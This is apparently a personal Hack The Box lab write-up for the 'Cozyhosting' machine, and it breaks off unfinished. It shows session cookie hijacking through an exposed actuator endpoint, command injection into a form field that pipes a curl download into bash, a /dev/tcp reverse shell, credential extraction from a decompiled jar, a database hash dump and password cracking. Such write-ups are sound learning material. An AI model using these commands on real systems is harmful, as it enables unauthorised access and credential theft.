# Machine: Cozyhosting [Hacked]
This is the fifteenth machine I have completed on the hackthebox platform. 
### Scan
IP_MACHINE: ip of cozyhosting
```
  nmap -sC -sV -p- --min-rate 5000 IP_MACHINE
```
add the domain cozyhosting.htb to the /etc/hosts file and open [ Burpsuite > Proxy > Open Browser ] navigate to route cozyhosting.htb/login. And do a login test with the credentials test:test
### Cookie Hijacking
open the [ Developer Tools > Application > Cookies > http://cozyhosting.htb/ ]. Where we can see a cookie that has been generated when trying to log in
```
JSESSIONID:VALUE
```
Now we will use gobuster to discover hidden directories:
```
gobuster dir --url http://cozyhosting.htb/ --wordlist $HOME/SecLists/Discovery/Web-Content/spring-boot.txt
### this is the one we are interested in: /actuator/sessions
```
We open a new tab and go to http://cozyhosting.htb/actuator/sessions where we can see a cookie generated that does not have authorization and another that does belong to the user Khanderson. 
then we copy it and replace it in our cookie [ Developer Tools > Application > Cookies > http://cozyhosting.htb/ ] and refresh the page.
### Admin dashboard
Now that we have logged in to the administration panel of the web application, we activate burpsuite traffic interception (Intercept is on). and enter the following values in the connection fields at the end of the Dashboard. We capture the POST method in Burpsuite and send it to [Burpsuite > Repeater].
```
Hostname: IP_MACHINE
Username: test
```
## Getting a reverse shell
already in [Bursuite > Repeater] we have the following message body
```
 host=IP_MACHINE&username=test
```
On our machine, we create a *payload.txt* file with the following content ( MY_IP: the IP address of our machine )
```
bash -i >& /dev/tcp/MY_IP/1234 0>&1
```
we initialize an http server on port 80
```
sudo python3 -m http.server 80
```
in a new terminal we initialize netcat
```
nc -nlvp 1234
```
now we manipulate the message body that we send to [Burpsuite > Repeater]
```
# Burpsuite payload
host=IP_MACHINE&username=$(curl$IFS"MY_IP"/payload.txt|bash)
```
With that we have a reverse shell and when we execute "ls" we discover a file called cloudhosting-0.0.1.jar that we will download locally on our machine to reverse engineer it. then within the reverse shell that we did to cozyhosting we started an http server.
```
# cozyhosting reverse shell
python3 -m http.server
```
To download it to our local machine we use:
```
# local machine
wget IP_MACHINE/cloudhosting-0.0.1.jar
```
## Exploiting the database
To reverse engineer the file we obtained, we opened [ jd-gui > Openfile > cloudhosting-0.0.1.jar ]. and we head to BOOT-INF/classes/application.properties where we will find the postgres database configurations:
```
# AN_PASSWORD: is the database password
spring.datasource.username=postgres
spring.datasource.password=AN_PASSWORD
```
now we go back to the reverse-shell in cozyhosting but we have to get a fully-tty. The procedure to obtain a fully-tty is as follows:
```
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
Now we enter the Postgres database of the remote system with the credentials that we obtained by reverse engineering the .jar file
```
psql -h <host> -U <username>
# It will ask us for a password, so we enter the AN_PASSWORD
```
Within the database we execute the following commands to obtain the authentication hashes of the system users
```
\c cozyhosting
\d
SELECT * FROM users;
```
## breaking hashes (cryptography)
which would look like this:
```
# HASHONE: is a hash of 61 characters
# HASHTWO: is another hash of 61 characters
kanderson | HASHONE | User
admin     | HASHTWO | Admin
```
We save them in a hash.txt file and proceed to decrypt the hashes with the John the Ripper tool (This process could take several minutes or even seconds depending on the GPU you have)
```
john --wordlist=$HOME/rockyou.txt hash.txt
```
#### to be continued... 
